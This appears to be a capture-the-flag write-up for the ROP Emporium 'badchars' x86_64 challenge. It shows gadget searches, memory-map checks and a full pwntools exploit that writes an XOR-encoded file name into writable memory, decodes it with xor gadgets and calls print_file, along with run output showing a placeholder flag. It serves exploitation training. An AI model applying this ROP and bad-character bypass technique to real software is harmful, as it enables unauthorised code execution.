


**search for gadget**
```shell
➜  x86_64 ROPgadget --binary ./badchars --only "pop|ret"
Gadgets information
============================================================
0x000000000040069c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret    # used
0x000000000040069e : pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004006a0 : pop r14 ; pop r15 ; ret
0x00000000004006a2 : pop r15 ; ret
0x000000000040069b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040069f : pop rbp ; pop r14 ; pop r15 ; ret
0x0000000000400588 : pop rbp ; ret
0x00000000004006a3 : pop rdi ; ret  # used
0x00000000004006a1 : pop rsi ; pop r15 ; ret
0x000000000040069d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004004ee : ret
0x0000000000400293 : ret 0xb2ec

Unique gadgets found: 12

➜  x86_64 ROPgadget --binary ./badchars --only "mov|ret"
Gadgets information
============================================================
0x0000000000400635 : mov dword ptr [rbp], esp ; ret
0x0000000000400634 : mov qword ptr [r13], r12 ; ret # used
0x00000000004004ee : ret
0x0000000000400293 : ret 0xb2ec

➜  x86_64 ROPgadget --binary ./badchars --only "xor|ret"
Gadgets information
============================================================
0x00000000004004ee : ret
0x0000000000400293 : ret 0xb2ec
0x0000000000400628 : xor byte ptr [r15], r14b ; ret # used ps: r14b is the low 8bits of r14
0x0000000000400629 : xor byte ptr [rdi], dh ; ret   

Unique gadgets found: 4
```

**where to write**
```shell
gdb-peda$ vmmap 
Start              End                Perm      Name
0x00400000         0x00401000         r-xp      /home/pitta/workspace/pwn_learn/rec0rd/ROP/ROPemporium/badchars/x86_64/badchars
0x00600000         0x00601000         r--p      /home/pitta/workspace/pwn_learn/rec0rd/ROP/ROPemporium/badchars/x86_64/badchars
0x00601000 (*)     0x00602000         rw-p      /home/pitta/workspace/pwn_learn/rec0rd/ROP/ROPemporium/badchars/x86_64/badchars
```

**call print_file**
```shell
➜  x86_64 objdump -D ./badchars| grep "print_"
0000000000400510 <print_file@plt>:
  400620:       e8 eb fe ff ff          callq  400510 <print_file@plt>
```

# exploit
```python
from pwn import *

pipe = process("./badchars",env={"LD_PRELOAD":"./libbadchars.so"})

flag = "flag.txt"
reflag = b""
badchars = ['x', 'g', 'a', '.']
for i in range(len(flag)):
    if flag[i] in badchars:
        reflag += chr(ord(flag[i]) ^ 1)
    else:
        reflag += flag[i]
# print(reflag)

chain = "E" * 40            # padding
chain += p64(0x40069c)      # pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
chain += reflag             # r12
chain += p64(0x601f00)      # r13  -> target memory
chain += p64(0)             # r14
chain += p64(0)             # r15
chain += p64(0x400634)      # mov qword ptr [r13], r12 ; ret

# --------- xor back ----------
chain += p64(0x4006a0)      # pop r14 ; pop r15 ; ret
chain += p64(1)             # r14
chain += p64(0x601f00 + 2)  # r15
chain += p64(0x400628)      # xor byte ptr [r15], r14b ; ret

chain += p64(0x4006a0)      # pop r14 ; pop r15 ; ret
chain += p64(1)             # r14
chain += p64(0x601f00 + 3)  # r15
chain += p64(0x400628)      # xor byte ptr [r15], r14b ; ret

chain += p64(0x4006a0)      # pop r14 ; pop r15 ; ret
chain += p64(1)             # r14
chain += p64(0x601f00 + 4)  # r15
chain += p64(0x400628)      # xor byte ptr [r15], r14b ; ret

chain += p64(0x4006a0)      # pop r14 ; pop r15 ; ret
chain += p64(1)             # r14
chain += p64(0x601f00 + 6)  # r15
chain += p64(0x400628)      # xor byte ptr [r15], r14b ; ret

chain += p64(0x4006a3)      # pop rdi ; ret
chain += p64(0x601f00)
chain += p64(0x400510)      # <print_file@plt>

context.log_level = "DEBUG"
print(pipe.recvuntil("> "))
pipe.sendline(chain)
print(pipe.recv())

```

**run exp.py**
```shell
➜  x86_64 python ./exp.py                     
[+] Starting local process './badchars': pid 69251
[DEBUG] Received 0x44 bytes:
    'badchars by ROP Emporium\n'
    'x86_64\n'
    '\n'
    "badchars are: 'x', 'g', 'a', '.'\n"
    '> '
badchars by ROP Emporium
x86_64

badchars are: 'x', 'g', 'a', '.'
> 
[DEBUG] Sent 0xf1 bytes:
    00000000  45 45 45 45  45 45 45 45  45 45 45 45  45 45 45 45  │EEEE│EEEE│EEEE│EEEE│
    *
    00000020  45 45 45 45  45 45 45 45  9c 06 40 00  00 00 00 00  │EEEE│EEEE│··@·│····│
    00000030  66 6c 60 66  2f 74 79 74  00 1f 60 00  00 00 00 00  │fl`f│/tyt│··`·│····│
    00000040  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
    00000050  34 06 40 00  00 00 00 00  a0 06 40 00  00 00 00 00  │4·@·│····│··@·│····│
    00000060  01 00 00 00  00 00 00 00  02 1f 60 00  00 00 00 00  │····│····│··`·│····│
    00000070  28 06 40 00  00 00 00 00  a0 06 40 00  00 00 00 00  │(·@·│····│··@·│····│
    00000080  01 00 00 00  00 00 00 00  03 1f 60 00  00 00 00 00  │····│····│··`·│····│
    00000090  28 06 40 00  00 00 00 00  a0 06 40 00  00 00 00 00  │(·@·│····│··@·│····│
    000000a0  01 00 00 00  00 00 00 00  04 1f 60 00  00 00 00 00  │····│····│··`·│····│
    000000b0  28 06 40 00  00 00 00 00  a0 06 40 00  00 00 00 00  │(·@·│····│··@·│····│
    000000c0  01 00 00 00  00 00 00 00  06 1f 60 00  00 00 00 00  │····│····│··`·│····│
    000000d0  28 06 40 00  00 00 00 00  a3 06 40 00  00 00 00 00  │(·@·│····│··@·│····│
    000000e0  00 1f 60 00  00 00 00 00  10 05 40 00  00 00 00 00  │··`·│····│··@·│····│
    000000f0  0a                                                  │·│
    000000f1
[DEBUG] Received 0x2c bytes:
    'Thank you!\n'
    'ROPE{a_placeholder_32byte_flag!}\n'
Thank you!
ROPE{a_placeholder_32byte_flag!}    # flag
```